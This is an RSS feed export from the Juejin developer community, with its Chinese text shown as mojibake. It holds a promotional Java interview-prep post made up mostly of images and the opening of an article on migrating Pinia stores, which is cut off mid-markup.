<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[é˜¿é‡Œæœ€æ–°å‡ºå“Javaé¢è¯•æ ¸å¿ƒè®²ï¼ˆç»ˆæç‰ˆï¼‰ï¼ŒGithubå·²æ˜Ÿæ ‡50K!]]></title>    <link>https://juejin.cn/post/7581073928715829282</link>    <guid>https://juejin.cn/post/7581073928715829282</guid>    <pubDate>2025-12-08T05:58:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581073928715829282" data-draft-id="7581041679189442595" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜¿é‡Œæœ€æ–°å‡ºå“Javaé¢è¯•æ ¸å¿ƒè®²ï¼ˆç»ˆæç‰ˆï¼‰ï¼ŒGithubå·²æ˜Ÿæ ‡50K!"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•,Java"/> <meta itemprop="datePublished" content="2025-12-08T05:58:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaæ°´è§£"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜¿é‡Œæœ€æ–°å‡ºå“Javaé¢è¯•æ ¸å¿ƒè®²ï¼ˆç»ˆæç‰ˆï¼‰ï¼ŒGithubå·²æ˜Ÿæ ‡50K!
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaæ°´è§£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:58:36.000Z" title="Mon Dec 08 2025 05:58:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    24
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ—¶å€™å°´å°¬çš„ç°è±¡å°±å‡ºç°äº†ï¼š<strong>è™½ç„¶å…«è‚¡æ–‡èƒŒçš„å¥½å¹¶ä¸èƒ½ä»£è¡¨è¿™ä¸ªäººæœ‰å®é™…å·¥ä½œèƒ½åŠ›ï¼Œä½†ä¼ä¸šè¿˜æ˜¯ä¼šåšæŒè¦ç”¨å…«è‚¡æ–‡æ¥è€ƒå¯Ÿå€™é€‰äººã€‚</strong> Â Â Â å…¶ä¸­æœ€ç›´æ¥çš„åŸå› å°±æ˜¯å›½å†…çš„å¼€å‘å²—ä½ä¾›è¿‡äºæ±‚ï¼Œéå¸¸å†…å·ï¼Œè€Œå…«è‚¡æ–‡å°±æ˜¯ç›®å‰ä¼ä¸šæœ€é«˜æ•ˆçš„ç”„åˆ«å€™é€‰äººçš„æ–¹å¼ã€‚æˆ‘ä»¬æ— æ³•æ”¹å˜è¿™ä¸€ç°çŠ¶ï¼Œæ‰€ä»¥åªèƒ½æ”¹å˜è‡ªå·±ï¼Œé€‚åº”ç›®å‰äº’è”ç½‘èƒŒå…«è‚¡çš„ç°çŠ¶ã€‚</p>
<p>é‚£ä¹ˆå€Ÿæ­¤æœºä¼šï¼Œä¹Ÿä¸ºäº†æ›´å¥½çš„åŠ©åŠ›å¹¿å¤§ç¨‹åºå‘˜æœ‹å‹é¢è¯•ï¼Œå°ç¼–ä»Šå¤©å°±è¿™é‡Œç»™å¤§å®¶åˆ†äº«ä¸€ä»½é˜¿é‡Œæœ€æ–°å‘å¸ƒJavaé¢è¯•æ ¸å¿ƒè®²ï¼ï¼ˆä¸Šæœˆåº•å…¶å®æˆ‘ä¹Ÿåˆ†äº«äº†ä¸€ä»½Javaæ¶æ„å¸ˆé¢è¯•æŒ‡å—ï¼Œä½†å¾ˆå¤šç²‰ä¸åé¦ˆè¯´é‚£ä»½æ˜¯å¯¹æ ‡æ¶æ„å¸ˆçš„é¢è¯•èµ„æ–™ï¼Œè‡ªå·±ç›®å‰åªæ˜¯é¢ä¸­é«˜çº§å¼€å‘å²—ä½ï¼Œæš‚æ—¶è¿˜ç”¨ä¸ä¸Šé‚£ä¸ªï¼Œæ‰€ä»¥æ‰æœ‰ä»Šå¤©è¿™ç¯‡æ–‡ç« ï¼‰</p>
<h2 data-id="heading-0">é˜¿é‡ŒJavaé¢è¯•æ ¸å¿ƒè®²ï¼ˆç»ˆæç‰ˆï¼‰</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc1ff40cc23f4e4a920663436e24469f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=AECcXZr9dhqvQtD%2BgBpNhOt6fWI%3D" alt="" loading="lazy"/></p>
<blockquote>
<blockquote>
<p>è¿™ä»½å°å†Œæ˜¯ä»åŸºç¡€åˆ°é«˜çº§æ¶µç›–äº†è¶³è¶³30ä¸ªæŠ€æœ¯æ ˆçš„ï¼ŒåŒ…å«äº†JAVAåŸºç¡€ï¼ŒJAVAé›†åˆï¼ŒJAVAå¹¶å‘ï¼ŒSpringï¼Œå¾®æœåŠ¡ï¼ŒNettyï¼Œè®¡ç®—æœºç½‘ç»œï¼ŒMQï¼ŒZookeeperï¼ŒRedisï¼ŒMySQLï¼Œæ•°æ®ç»“æ„ä¸ç®—æ³•ä»¥åŠè®¾è®¡æ¨¡å¼ç­‰ç­‰ï¼Œè¶³è¶³200ä½™é¡µï¼Œç”±äºæ˜é‡‘ç¯‡å¹…é™åˆ¶æˆ‘åœ¨è¿™é‡Œå°±åªå±•ç¤ºéƒ¨åˆ†å†…å®¹äº†ï¼Œæ‰«ä¸€æ‰«å…è´¹è·å–</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11353f4653b44cc9943a91573eb6f69e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=cIQ2xGVcNyLqz%2BzQivK95npGv2E%3D" alt="image.png" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-1">JVM</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba08c1285081450ba67aafd49e5cb087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=8XLCijODvsNtWDI6Ki%2B2ZzYFS3A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/796daf7653784fa497a6d6f0ca51493d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=NANR5ydhCa44AzQ0YhDb6IMeeZk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">Javaå¹¶å‘çŸ¥è¯†</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d81263e85144e8d8845657344659bf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=aikJqiFPUhDfQ1c%2BZ4q5XukejxU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bdc369e81304be69da09cf23a9cb201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=tpr1iuRnxG%2F6WWHQv8Kgj8fkWtk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">SpringåŸç†</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eed49632f3d42dbadaaeda7e0364df6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=2EqCDrE2x3BBb1KOPxvllL9uQdU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c241537537504180ae3d20ce78a31f57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=FM%2FYgNRSOQ%2FyY5f8TXp5gxLOF0k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">å¾®æœåŠ¡</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3cae6556f014681b13ee997009616b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=WawbtFNvA9Y%2B6NRQknG00D%2BDcrU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e552640482bc4f0db9f6e8b83810b846~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=Bn38MCTqpz%2BdfuJ07Q0FaCsUYCs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">Netty</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b5aa1250940447fac5beb6c90c926df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=LyhBJox8s%2FWN4cx9KWqTnmJlMuM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fac3b6114bb4a2e8faad6afe68030ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=YqBhZqCLvkEaEc66i8FH9MaJYYw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">è®¡ç®—æœºç½‘ç»œ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd29b9310089419883d42f1a6046718a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=43mdHvtYswUgMjIPFnK8lVUhpe8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34a1f8d76c574cfe930a10e712cdc585~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=JJ4pxiIqmbx1PrA9nwS6QRrOX5k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">æ•°æ®åº“</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8425d058d9044cd4ab75ccdeec44bb3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=smsRrce%2BGvmna6%2Bys6RdY4kEv90%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7252e53d196a41008417138642f9b7e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=SkFeT184IJWyZ%2BleiUBwyRoZ9Ww%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">æ•°æ®ç»“æ„ä¸ç®—æ³•</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b32306eb63e410da5a97ecd65663fe3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=wHJWh7P0ZTq0S%2BiCXMiZlWJhk6M%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6612e74c27114c3ca2147b74fdbd85d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=pMtzQXWlvlKNfqH9T8Njnnm8mr8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/945ace39873d41b1b9af658345b676af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=0URKD2nTKktdmq%2BY2IELCwB5Py8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">è®¾è®¡æ¨¡å¼</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffdd0efc50bc42fa8c312d01835fbf7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=V9yPdHhxx2yzIwdzNS9%2Bwwt73yc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">ä¸­é—´ä»¶</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c38efb2fe25c47e0875a83e54cbbe8b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=anCjApeiqKJViEMKbJ30IZ30Hh0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bf1afa845044918a87183138ad4b6ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=4YD9%2BzvBQ%2FyST%2FXaSQGbWPz5XUw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">æœ€å</h2>
<p>æ–‡ç« åˆ°è¿™é‡Œç¯‡å¹…å·²ç»å¾ˆé•¿äº†ï¼Œå°±ä¸ç»§ç»­æ‹‰é•¿ç¯‡å¹…äº†ï¼Œ</p>
<blockquote>
<blockquote>
<p>è¿™ä»½å°å†Œæ˜¯ä»åŸºç¡€åˆ°é«˜çº§æ¶µç›–äº†è¶³è¶³30ä¸ªæŠ€æœ¯æ ˆçš„ï¼ŒåŒ…å«äº†JAVAåŸºç¡€ï¼ŒJAVAé›†åˆï¼ŒJAVAå¹¶å‘ï¼ŒSpringï¼Œå¾®æœåŠ¡ï¼ŒNettyï¼Œè®¡ç®—æœºç½‘ç»œï¼ŒMQï¼ŒZookeeperï¼ŒRedisï¼ŒMySQLï¼Œæ•°æ®ç»“æ„ä¸ç®—æ³•ä»¥åŠè®¾è®¡æ¨¡å¼ç­‰ç­‰ï¼Œè¶³è¶³200ä½™é¡µï¼Œç”±äºæ˜é‡‘ç¯‡å¹…é™åˆ¶æˆ‘åœ¨è¿™é‡Œå°±åªå±•ç¤ºéƒ¨åˆ†å†…å®¹äº†ï¼Œæ‰«ä¸€æ‰«å…è´¹è·å–</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d68eb4c115da4b3f829d4ec68b9e6b5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779588&amp;x-signature=eeAAGjNaxYNM2cHXNAmalk%2F8zdo%3D" alt="image.png" loading="lazy"/></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pinia Store å¹³æ»‘è¿ç§»ï¼šç”¨ä»£ç†æ¨¡å¼å®ç°é›¶é£é™©é‡æ„]]></title>    <link>https://juejin.cn/post/7581036773607620608</link>    <guid>https://juejin.cn/post/7581036773607620608</guid>    <pubDate>2025-12-08T05:50:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581036773607620608" data-draft-id="7581098720034045992" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pinia Store å¹³æ»‘è¿ç§»ï¼šç”¨ä»£ç†æ¨¡å¼å®ç°é›¶é£é™©é‡æ„"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-08T05:50:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿"/> <meta itemprop="url" content="https://juejin.cn/user/2277843821926871"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pinia Store å¹³æ»‘è¿ç§»ï¼šç”¨ä»£ç†æ¨¡å¼å®ç°é›¶é£é™©é‡æ„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843821926871/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.4 èä¼šè´¯é€š
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.4 èä¼šè´¯é€š" title="VIP.4 èä¼šè´¯é€š" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:50:44.000Z" title="Mon Dec 08 2025 05:50:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px 